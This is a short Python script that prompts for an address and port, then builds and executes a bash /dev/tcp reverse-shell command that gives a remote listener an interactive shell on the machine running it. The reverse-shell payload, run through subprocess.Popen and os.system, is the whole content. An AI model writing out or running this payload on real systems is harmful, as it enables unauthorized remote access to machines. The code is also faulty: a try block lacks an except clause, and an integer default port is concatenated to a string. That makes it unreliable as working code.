import os
import sys
import time
import random
import subprocess






addr = input("Target IPv4 address (ex: 10.10.10.10): ")

prt = input("\n Target port enter for default(10000): ")

if prt == "":
  prt = 10000

payload = "bash -i >& /dev/tcp/" + addr + "/" + prt + " 0>&1"

try:
  subprocess.Popen(payload, shell=True)

try:
  os.system(payload)

except:
  print("Unable to generate payload!")


